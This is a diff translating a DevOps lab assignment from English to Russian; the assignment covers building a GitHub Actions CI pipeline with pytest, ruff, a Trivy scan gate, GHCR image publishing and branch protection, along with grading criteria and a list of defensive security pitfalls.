+> 💡 **Матрица против сканирования:** если вы добавите Trivy внутрь матричной задачи `test`, он запустится дважды (по разу на версию Python) — расточительно, но безвредно. Чтобы запустить его один раз, либо гейтируйте его через `if: matrix.python-version == '3.13'`, либо вынесите в отдельную задачу `scan`, от которой `docker` `needs:`.
 >
-> 🌐 **DB mirror on restricted networks:** if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, set `TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2` in the step's `env:` — Aqua publishes an anonymous mirror there (see Lab 2's note).
+> 🌐 **Зеркало DB в ограниченных сетях:** если ваш runner не может достучаться до `ghcr.io/aquasecurity/trivy-db`, задайте `TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2` в `env:` шага — Aqua публикует там анонимное зеркало (см. примечание в лабораторной 2).
 
 ```yaml
-      - name: ___                                  # YOUR TASK: descriptive step name
-        uses: aquasecurity/trivy-action@___        # YOUR TASK: version (>= 0.35.0; NEVER Trivy v0.69.4)
+      - name: ___                                  # ВАША ЗАДАЧА: описательное имя шага
+        uses: aquasecurity/trivy-action@___        # ВАША ЗАДАЧА: версия (>= 0.35.0; НИКОГДА Trivy v0.69.4)
         with:
-          scan-type: ___                           # YOUR TASK: fs or image? what do we have at this stage?
-          scan-ref: ___                            # YOUR TASK: which path holds requirements.txt?
-          severity: ___                            # YOUR TASK: which severities should block?
-          exit-code: ___                           # YOUR TASK: what value turns this from warn into gate?
-          ignore-unfixed: ___                      # YOUR TASK: skip CVEs with no patch? trade-off?
+          scan-type: ___                           # ВАША ЗАДАЧА: fs или image? что у нас на этом этапе?
+          scan-ref: ___                            # ВАША ЗАДАЧА: какой путь содержит requirements.txt?
+          severity: ___                            # ВАША ЗАДАЧА: какие серьёзности должны блокировать?
+          exit-code: ___                           # ВАША ЗАДАЧА: какое значение превращает это из предупреждения в гейт?
+          ignore-unfixed: ___                      # ВАША ЗАДАЧА: пропускать CVE без патча? компромисс?
 ```
 
-### 4.2 — Don't silence fixable CVEs
+### 4.2 — Не замалчивайте исправимые CVE
 
-`YOUR TASK`: if Trivy flags a dependency, the **fix is in the PR**: bump the version in `requirements.txt`. Don't paper over it with `.trivyignore` or by raising the severity threshold. Track genuinely-unfixable findings in a GitHub issue with the CVE ID and a date.
+`ВАША ЗАДАЧА`: если Trivy пометил зависимость, **исправление — в PR**: поднимите версию в `requirements.txt`. Не замазывайте это `.trivyignore` или повышением порога серьёзности. Отслеживайте по-настоящему неисправимые находки в GitHub issue с id CVE и датой.
 
-### 4.3 — Branch protection
+### 4.3 — Защита ветки
 
-`YOUR TASK`: in **Settings → Branches → Branch protection rules** for `main`:
+`ВАША ЗАДАЧА`: в **Settings → Branches → Branch protection rules** для `main`:
 
-- ✅ Require a pull request before merging (≥ 1 review)
-- ✅ Require status checks to pass — pick **`test`** (every matrix cell) and **`docker`**
-- ✅ Require branches to be up to date before merging
-- ✅ Do not allow bypassing the above (admins included)
+- ✅ Требовать pull request перед слиянием (≥ 1 ревью)
+- ✅ Требовать прохождения проверок статуса — выберите **`test`** (каждую ячейку матрицы) и **`docker`**
+- ✅ Требовать актуальности веток перед слиянием
+- ✅ Не разрешать обход описанного выше (включая администраторов)
 
-The green CI badge is decoration; required status checks are the gate.
+Зелёный бейдж CI — это украшение; обязательные проверки статуса — это гейт.
 
-### 4.4 — Proof of work
+### 4.4 — Доказательство выполнения
 
-**Paste into `docs/LAB03.md`:**
+**Вставьте в `docs/LAB03.md`:**
 
-- The Trivy step output from a green run (illustrative if you've fixed everything — your output will say `0` findings)
-- If you bumped a dep, show the before/after `requirements.txt` diff
-- Screenshot of your branch protection settings showing the required checks
-- One sentence on each: severity threshold choice; `ignore-unfixed` trade-off
-
----
-
-## Bonus Task — Path-Filtered Multi-App CI + Coverage (2 pts)
-
-Less hand-holding here. You already know how to write a workflow.
-
-### Bonus.1 — Second workflow for the compiled-language app (1 pt)
-
-If you did Lab 1's bonus (Go/Rust/Java sibling), wire it up:
-
-- New file `.github/workflows/<lang>-ci.yml` with the same shape: lint + test + (optionally) build image.
-- **Both** workflows must `paths:`-filter to their own app dir so a commit touching only `app_python/` does not trigger the Go workflow, and vice versa.
-- Demonstrate selective triggering: one commit in each app dir, show the Actions tab only fires the relevant workflow.
-
-### Bonus.2 — Coverage in CI (1 pt)
-
-- Run `pytest --cov=app_python --cov-report=xml --cov-report=term` in the `test` job.
-- Upload to **Codecov** (`codecov/codecov-action@v4` — free for public repos) or **Coveralls**.
-- Add a coverage badge to `app_python/README.md`.
-- In `docs/LAB03.md`, state your coverage percentage and **one sentence on what's intentionally uncovered and why** (e.g. `if __name__ == "__main__":` blocks). Coverage isn't a target — Fowler again: *"useful for finding untested code; not a useful target."*
+- Вывод шага Trivy из зелёного запуска (иллюстративно, если вы всё исправили — ваш вывод скажет `0` находок)
+- Если вы поднимали зависимость, покажите diff `requirements.txt` до/после
+- Скриншот ваших настроек защиты ветки, показывающий обязательные проверки
+- Одно предложение на каждое: выбор порога серьёзности; компромисс `ignore-unfixed`
 
 ---
 
-## How to Submit
+## Бонусная задача — CI для нескольких приложений с фильтрацией по путям + покрытие (2 балла)
+
+Здесь меньше подсказок. Вы уже знаете, как писать workflow.
+
+### Бонус.1 — Второй workflow для приложения на компилируемом языке (1 балл)
+
+Если вы делали бонус лабораторной 1 (аналог на Go/Rust/Java), подключите его:
+
+- Новый файл `.github/workflows/<lang>-ci.yml` с той же формой: lint + тест + (опционально) сборка образа.
+- **Оба** workflow должны фильтровать `paths:` по своему каталогу приложения, чтобы коммит, затрагивающий только `app_python/`, не запускал Go workflow, и наоборот.
+- Продемонстрируйте выборочный запуск: один коммит в каждом каталоге приложения, покажите, что вкладка Actions запускает только соответствующий workflow.
+
+### Бонус.2 — Покрытие в CI (1 балл)
+
+- Запустите `pytest --cov=app_python --cov-report=xml --cov-report=term` в задаче `test`.
+- Загрузите в **Codecov** (`codecov/codecov-action@v4` — бесплатно для публичных репозиториев) или **Coveralls**.
+- Добавьте бейдж покрытия в `app_python/README.md`.
+- В `docs/LAB03.md` укажите процент покрытия и **одно предложение о том, что намеренно не покрыто и почему** (например, блоки `if __name__ == "__main__":`). Покрытие — не цель. Снова Фаулер: *«полезно для поиска непротестированного кода; не является полезной целью»*.
+
+---
+
+## Как сдавать
 
 ```bash
 git switch -c lab03
 git add .github/workflows/python-ci.yml
 git add app_python/tests/ app_python/requirements-dev.txt
 git add app_python/docs/LAB03.md app_python/README.md
-# bonus only:
-git add .github/workflows/go-ci.yml          # if you did the language bonus
+# только бонус:
+git add .github/workflows/go-ci.yml          # если вы делали бонус с языком
 git commit -m "feat(lab03): CI pipeline — pytest, ruff, trivy gate, GHCR push"
 git push -u origin lab03
 ```
 
-Open **two** PRs:
+Откройте **два** PR:
 
-- `your-fork:lab03` → `course-repo:main` *(reviewed)*
-- `your-fork:lab03` → `your-fork:main` *(merges into your own main when done)*
+- `your-fork:lab03` → `course-repo:main` *(проверяется)*
+- `your-fork:lab03` → `your-fork:main` *(сливается в ваш собственный main по завершении)*
 
-CI runs automatically on both — that's the whole point.
+CI запускается автоматически на обоих — в этом весь смысл.
 
-PR checklist:
+Чек-лист PR:
 
 ```text
-- [ ] Task 1 — pytest 3+ tests, ruff clean, output pasted in docs/LAB03.md
-- [ ] Task 2 — workflow with on/permissions/concurrency/matrix; warm-cache time documented
-- [ ] Task 3 — docker job needs:test, GHCR push works, ≥ 2 tags, no push from fork PRs
-- [ ] Task 4 — Trivy gate with exit-code:"1", branch protection screenshot
-- [ ] Bonus — second workflow with path filters AND coverage badge (if attempted)
+- [ ] Задача 1 — pytest 3+ теста, ruff чистый, вывод вставлен в docs/LAB03.md
+- [ ] Задача 2 — workflow с on/permissions/concurrency/matrix; время тёплого кеша задокументировано
+- [ ] Задача 3 — задача docker needs:test, пуш в GHCR работает, ≥ 2 тега, нет пуша из PR из форков
+- [ ] Задача 4 — гейт Trivy с exit-code:"1", скриншот защиты ветки
+- [ ] Бонус — второй workflow с фильтрами путей И бейджем покрытия (если пытались)
 ```
 
 ---
 
-## Acceptance Criteria
+## Критерии приёмки
 
-### Task 1 (2 pts)
-- ✅ `requirements-dev.txt` exact-pinned (`pytest==X.Y.Z`, not `>=`)
-- ✅ Three tests asserting **behaviour** (status + body shape), one of them the 404 path
-- ✅ `pytest -q` and `ruff check .` both pass locally; outputs in `docs/LAB03.md`
+### Задача 1 (2 балла)
+- ✅ `requirements-dev.txt` точно закреплён (`pytest==X.Y.Z`, не `>=`)
+- ✅ Три теста проверяют **поведение** (статус + форма тела), один из них — путь 404
+- ✅ `pytest -q` и `ruff check .` проходят локально; выводы в `docs/LAB03.md`
 
-### Task 2 (3 pts)
-- ✅ `.github/workflows/python-ci.yml` triggers on `push` to `main` and `pull_request`, with a `paths:` filter
-- ✅ `concurrency` group by ref, `cancel-in-progress: true`
-- ✅ Matrix over Python 3.12 + 3.13, `fail-fast: false`
-- ✅ `setup-python@v5` with `cache: pip`, `cache-dependency-path:` set
-- ✅ Status badge in `app_python/README.md`; link to a green run
+### Задача 2 (3 балла)
+- ✅ `.github/workflows/python-ci.yml` срабатывает на `push` в `main` и `pull_request`, с фильтром `paths:`
+- ✅ Группа `concurrency` по ref, `cancel-in-progress: true`
+- ✅ Матрица по Python 3.12 + 3.13, `fail-fast: false`
+- ✅ `setup-python@v5` с `cache: pip`, заданным `cache-dependency-path:`
+- ✅ Статусный бейдж в `app_python/README.md`; ссылка на зелёный запуск
 
-### Task 3 (3 pts)
-- ✅ `docker` job has `needs: test`
-- ✅ Uses `GITHUB_TOKEN` (no PAT), `permissions: { packages: write }` scoped to the job
-- ✅ `metadata-action@v5` produces ≥ 2 tags (one immutable per-commit, e.g. `git-<sha>`)
-- ✅ `build-push-action@v6` with `cache-from/to: type=gha`
-- ✅ Image visible under your repo → Packages
-- ✅ No push from PRs (especially fork PRs)
+### Задача 3 (3 балла)
+- ✅ У задачи `docker` есть `needs: test`
+- ✅ Использует `GITHUB_TOKEN` (без PAT), `permissions: { packages: write }` ограничено задачей
+- ✅ `metadata-action@v5` создаёт ≥ 2 тега (один неизменяемый на коммит, например `git-<sha>`)
+- ✅ `build-push-action@v6` с `cache-from/to: type=gha`
+- ✅ Образ виден в вашем репозитории → Packages
+- ✅ Нет пуша из PR (особенно из PR из форков)
 
-### Task 4 (2 pts)
-- ✅ `aquasecurity/trivy-action@0.35.0` or later (NOT Trivy v0.69.4)
+### Задача 4 (2 балла)
+- ✅ `aquasecurity/trivy-action@0.35.0` или новее (НЕ Trivy v0.69.4)
 - ✅ `severity: HIGH,CRITICAL`, `exit-code: "1"`, `ignore-unfixed: true`
-- ✅ Scan blocks the docker job (in `test` or via a `scan` job + `needs:`)
-- ✅ Branch protection requires `test` and `docker` checks
+- ✅ Сканирование блокирует задачу docker (в `test` или через задачу `scan` + `needs:`)
+- ✅ Защита ветки требует проверок `test` и `docker`
 
-### Bonus (2 pts)
-- ✅ Second workflow with `paths:` filter on both, selective-trigger proof
-- ✅ Coverage XML generated, uploaded to Codecov/Coveralls, badge in README
+### Бонус (2 балла)
+- ✅ Второй workflow с фильтром `paths:` на обоих, доказательство выборочного запуска
+- ✅ XML покрытия сгенерирован, загружен в Codecov/Coveralls, бейдж в README
 
 ---
 
-## Rubric
+## Рубрика
 
-| Task | Points | Criteria |
+| Задача | Баллы | Критерии |
 |------|-------:|----------|
-| **Task 1** — Unit tests | **2** | Real assertions, 404 path covered, locally green |
-| **Task 2** — Test/lint job | **3** | Matrix + pip cache + concurrency + path filter; warm-cache time recorded |
-| **Task 3** — GHCR build/push | **3** | `needs: test`, `GITHUB_TOKEN`, ≥ 2 tags, no fork-PR push, image visible |
-| **Task 4** — Trivy gate | **2** | `exit-code: "1"`, gates docker, branch protection on |
-| **Bonus** | **2** | Path-filtered multi-app + coverage |
-| **Total** | **12** | 10 main + 2 bonus |
+| **Задача 1** — Модульные тесты | **2** | Реальные утверждения, путь 404 покрыт, локально зелёный |
+| **Задача 2** — Задача test/lint | **3** | Матрица + pip-кеш + concurrency + фильтр путей; зафиксировано время тёплого кеша |
+| **Задача 3** — Сборка/пуш GHCR | **3** | `needs: test`, `GITHUB_TOKEN`, ≥ 2 тега, нет пуша из PR из форков, образ виден |
+| **Задача 4** — Гейт Trivy | **2** | `exit-code: "1"`, гейтирует docker, защита ветки включена |
+| **Бонус** | **2** | Несколько приложений с фильтрацией путей + покрытие |
+| **Итого** | **12** | 10 основных + 2 бонусных |
 
-**Grading:**
-- **10/10:** all jobs green, scan genuinely gates, tests assert behaviour, docs concise with real evidence
-- **8–9/10:** CI works, good tests, one minor gap (e.g. forgot to scope `permissions`)
-- **6–7/10:** CI runs but Trivy is a warning, or no fork-PR guard, or thin tests
-- **<6/10:** workflow doesn't run, scan absent or non-gating, tests don't assert real behaviour
+**Оценка:**
+- **10/10:** все задачи зелёные, сканирование реально гейтирует, тесты проверяют поведение, docs лаконичны с реальными свидетельствами
+- **8–9/10:** CI работает, хорошие тесты, один незначительный пробел (например, забыли ограничить `permissions`)
+- **6–7/10:** CI работает, но Trivy — предупреждение, или нет защиты от PR из форков, или скудные тесты
+- **<6/10:** workflow не запускается, сканирование отсутствует или не гейтирует, тесты не проверяют реальное поведение
 
-**For full points:** tests catch real bugs · workflow you can defend line-by-line · `GITHUB_TOKEN` not a PAT · Trivy fails the job on HIGH/CRITICAL · branch protection actually on.
+**Для полных баллов:** тесты ловят реальные баги · workflow, который вы можете защитить строка за строкой · `GITHUB_TOKEN`, а не PAT · Trivy валит задачу при HIGH/CRITICAL · защита ветки действительно включена.
 
 ---
 
-## Resources
+## Ресурсы
 
 <details>
-<summary>📚 Documentation</summary>
+<summary>📚 Документация</summary>
 
 - [GitHub Actions Docs](https://docs.github.com/en/actions) · [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
 - [Building & Testing Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
 - [Publishing to GHCR](https://docs.github.com/en/actions/publishing-packages/publishing-docker-images)
 - [Security Hardening for Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
 - [pytest 8](https://docs.pytest.org/) · [Flask testing](https://flask.palletsprojects.com/en/stable/testing/) · [FastAPI testing](https://fastapi.tiangolo.com/tutorial/testing/)
-- [Trivy](https://github.com/aquasecurity/trivy) · [`trivy-action`](https://github.com/aquasecurity/trivy-action) (use ≥ v0.35.0) · [Grype](https://github.com/anchore/grype) alternative
+- [Trivy](https://github.com/aquasecurity/trivy) · [`trivy-action`](https://github.com/aquasecurity/trivy-action) (используйте ≥ v0.35.0) · [Grype](https://github.com/anchore/grype) альтернатива
 - [SemVer](https://semver.org/) · [CalVer](https://calver.org/) · [`docker/metadata-action`](https://github.com/docker/metadata-action)
-- [`act`](https://github.com/nektos/act) (run Actions locally) · [`actionlint`](https://github.com/rhysd/actionlint) · [`gh`](https://cli.github.com/) (`gh run watch`)
+- [`act`](https://github.com/nektos/act) (запуск Actions локально) · [`actionlint`](https://github.com/rhysd/actionlint) · [`gh`](https://cli.github.com/) (`gh run watch`)
 
 </details>
 
 <details>
-<summary>⚠️ Common Pitfalls (from real dry-runs)</summary>
+<summary>⚠️ Частые ошибки (из реальных прогонов)</summary>
 
-- **`@main` / floating tag pins** — `actions/checkout@main` lets an upstream compromise silently land in your CI. The `tj-actions/changed-files` 2025 attack (CVE-2025-30066) hit 23,000+ repos exactly this way. Pin to a major tag (`@v4`); for high-risk third-party actions, pin to a **full commit SHA** with a `# vX.Y.Z` comment.
-- **`permissions:` not set → write-all default on older repos** — repos created before Feb 2023 default the workflow token to **read/write everything**. Always declare `permissions: { contents: read }` at the top and grant `packages: write` only on the job that needs it. Verify under **Settings → Actions → General → Workflow permissions** that "Read repository contents and packages permissions" is the default.
-- **Pushing images from fork PRs** — a fork can rewrite the Dockerfile to exfiltrate secrets via `RUN` commands and use your `GITHUB_TOKEN` to publish a tainted image to your GHCR namespace. Gate the docker job on `if: github.event_name != 'pull_request'` (or stricter: `github.event.pull_request.head.repo.fork == false`).
-- **`trivy-action` floating + Trivy v0.69.4** — pinning `trivy-action@master` or installing Trivy via `curl ... install.sh` between March 19–20 2026 executed attacker code on the runner (CVE-2026-33634). Use `aquasecurity/trivy-action@0.35.0+` and pin Trivy to **v0.69.3** or a later patched build.
-- **Trivy DB download failures on restricted networks** — if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, the scan dies with `failed to download vulnerability DB`. Solutions: pre-pull the DB into a private mirror and set `TRIVY_DB_REPOSITORY=<your-mirror>`, or schedule a daily warm-up workflow that runs Trivy once on `main`.
-- **Matrix `fail-fast: true` hides regressions** — leaving the default `true` kills 3.13 the moment 3.12 fails. You then "fix" 3.12 without ever seeing what 3.13 was about to fail on. Always set `fail-fast: false` on a version matrix.
-- **Cache hits never invalidate** — if you point `cache-dependency-path:` at the wrong file (e.g. `requirements.txt` but you only updated `requirements-dev.txt`), the cache hashes don't change and you reinstall the old versions for the next month. Use the file your install command actually consumes, or list both.
-- **Tests pass but `app.py` doesn't import** — pytest happily collects zero tests if your test file has a `SyntaxError` and tells you `0 passed`. Use `pytest -q --strict-markers` and watch for the "collected 0 items" warning, or assert `len(tests) >= 3` in a meta-test.
-- **`pytest -q` reports `0 passed` because Flask's auto-reload swallowed the import error** — disable `FLASK_DEBUG` in the test fixture: `app.config["TESTING"] = True; app.config["DEBUG"] = False`.
-- **`ubuntu-latest` rotated under you** — Microsoft swaps the `latest` alias on its own schedule. A workflow that "worked yesterday" suddenly fails because `python3.10` is gone or `apt-get` returns 404. Pin to `ubuntu-24.04`.
-- **`docker/metadata-action` with only `type=raw,value=latest`** — pushes one mutable tag and nothing immutable. Always combine `latest` with `type=sha,prefix=git-` (or `type=semver`) so every build is traceable.
+- **Закрепление на `@main` / плавающих тегах** — `actions/checkout@main` позволяет компрометации upstream молча попасть в ваш CI. Атака `tj-actions/changed-files` 2025 года (CVE-2025-30066) задела 23 000+ репозиториев именно так. Закрепляйте на мажорном теге (`@v4`); для сторонних действий с высоким риском закрепляйте на **полном SHA коммита** с комментарием `# vX.Y.Z`.
+- **`permissions:` не заданы → по умолчанию write-all в старых репозиториях** — репозитории, созданные до февраля 2023, по умолчанию дают токену workflow **чтение/запись всего**. Всегда объявляйте `permissions: { contents: read }` вверху и выдавайте `packages: write` только задаче, которой это нужно. Убедитесь в **Settings → Actions → General → Workflow permissions**, что «Read repository contents and packages permissions» — значение по умолчанию.
+- **Пуш образов из PR из форков** — форк может переписать Dockerfile, чтобы эксфильтровать секреты через команды `RUN`, и использовать ваш `GITHUB_TOKEN`, чтобы опубликовать заражённый образ в вашем пространстве имён GHCR. Гейтируйте задачу docker через `if: github.event_name != 'pull_request'` (или строже: `github.event.pull_request.head.repo.fork == false`).
+- **Плавающий `trivy-action` + Trivy v0.69.4** — закрепление `trivy-action@master` или установка Trivy через `curl ... install.sh` между 19–20 марта 2026 выполняла код атакующего на runner (CVE-2026-33634). Используйте `aquasecurity/trivy-action@0.35.0+` и закрепляйте Trivy на **v0.69.3** или более поздней исправленной сборке.
+- **Сбои загрузки Trivy DB в ограниченных сетях** — если ваш runner не может достучаться до `ghcr.io/aquasecurity/trivy-db`, сканирование умирает с `failed to download vulnerability DB`. Решения: предварительно подтяните DB в приватное зеркало и задайте `TRIVY_DB_REPOSITORY=<your-mirror>`, или запланируйте ежедневный прогревающий workflow, который раз в день запускает Trivy на `main`.
+- **`fail-fast: true` в матрице скрывает регрессии** — оставленное по умолчанию `true` убивает 3.13 в момент, когда падает 3.12. Затем вы «чините» 3.12, так и не увидев, на чём собиралась упасть 3.13. Всегда ставьте `fail-fast: false` в матрице версий.
+- **Попадания в кеш никогда не инвалидируются** — если вы нацелите `cache-dependency-path:` на неправильный файл (например, `requirements.txt`, но обновили только `requirements-dev.txt`), хеши кеша не меняются, и вы переустанавливаете старые версии следующий месяц. Используйте файл, который реально использует ваша команда установки, или перечислите оба.
+- **Тесты проходят, но `app.py` не импортируется** — pytest спокойно находит ноль тестов, если в вашем тестовом файле `SyntaxError`, и сообщает вам `0 passed`. Используйте `pytest -q --strict-markers` и следите за предупреждением «collected 0 items», или проверяйте `len(tests) >= 3` в мета-тесте.
+- **`pytest -q` сообщает `0 passed`, потому что автоперезагрузка Flask проглотила ошибку импорта** — отключите `FLASK_DEBUG` в тестовой фикстуре: `app.config["TESTING"] = True; app.config["DEBUG"] = False`.
+- **`ubuntu-latest` сменился под вами** — Microsoft меняет псевдоним `latest` по своему графику. Workflow, который «работал вчера», внезапно падает, потому что `python3.10` исчез или `apt-get` возвращает 404. Закрепляйте на `ubuntu-24.04`.
+- **`docker/metadata-action` только с `type=raw,value=latest`** — пушит один изменяемый тег и ничего неизменяемого. Всегда комбинируйте `latest` с `type=sha,prefix=git-` (или `type=semver`), чтобы каждая сборка была отслеживаемой.
 
 </details>
 
 <details>
-<summary>🛠️ Tools worth knowing</summary>
+<summary>🛠️ Инструменты, которые стоит знать</summary>
 
-- [`act`](https://github.com/nektos/act) — runs your workflow in a local container; faster feedback than push-and-pray
-- [`actionlint`](https://github.com/rhysd/actionlint) — lints workflow YAML; catches `runs-on: ubunto-24.04` typos before CI does
-- [`gh run watch`](https://cli.github.com/manual/gh_run_watch) — live-tail a running workflow from the terminal
-- [`gh workflow run`](https://cli.github.com/manual/gh_workflow_run) — trigger a `workflow_dispatch` run from your shell
-- [Dependabot](https://docs.github.com/en/code-security/dependabot) — auto-PRs to keep `actions/checkout@v4` and `pytest` fresh; one `.github/dependabot.yml`, no token, no third party
+- [`act`](https://github.com/nektos/act) — запускает ваш workflow в локальном контейнере; обратная связь быстрее, чем «пуш и молись»
+- [`actionlint`](https://github.com/rhysd/actionlint) — линтит YAML workflow; ловит опечатки вроде `runs-on: ubunto-24.04` раньше CI
+- [`gh run watch`](https://cli.github.com/manual/gh_run_watch) — наблюдение за запущенным workflow в реальном времени из терминала
+- [`gh workflow run`](https://cli.github.com/manual/gh_workflow_run) — запуск прогона `workflow_dispatch` из вашей оболочки
+- [Dependabot](https://docs.github.com/en/code-security/dependabot) — авто-PR для поддержания свежести `actions/checkout@v4` и `pytest`; один `.github/dependabot.yml`, без токена, без сторонних
 
 </details>
 
 ---
 
-## Looking Ahead
+## Взгляд вперёд
 
-| Lab | What CI does for it |
+| Лабораторная | Что CI делает для неё |
 |---:|---|
-| 4 | `terraform plan` becomes a CI gate — same idea as `pytest` |
-| 5–6 | `ansible-playbook --check` in CI; idempotency proven on every PR |
-| 7–8 | Integration tests once Loki + Prometheus land |
-| 9–10 | CI validates K8s manifests / Helm charts (`helm lint`, `kubeval`) |
-| 13 | ArgoCD watches the GHCR image **this** pipeline publishes — GitOps loop closes |
-| Every future lab | this workflow is your safety net |
+| 4 | `terraform plan` становится гейтом CI — та же идея, что `pytest` |
+| 5–6 | `ansible-playbook --check` в CI; идемпотентность доказана на каждом PR |
+| 7–8 | Интеграционные тесты после появления Loki + Prometheus |
+| 9–10 | CI валидирует манифесты K8s / чарты Helm (`helm lint`, `kubeval`) |
+| 13 | ArgoCD наблюдает за GHCR-образом, который публикует **этот** конвейер — цикл GitOps замыкается |
+| Каждая будущая лабораторная | этот workflow — ваша страховка |
 
-> **Remember:** a good pipeline is fast, deterministic, and boring. Excitement in CI is a smell.
+> **Помните:** хороший конвейер быстрый, детерминированный и скучный. Азарт в CI — это запашок.
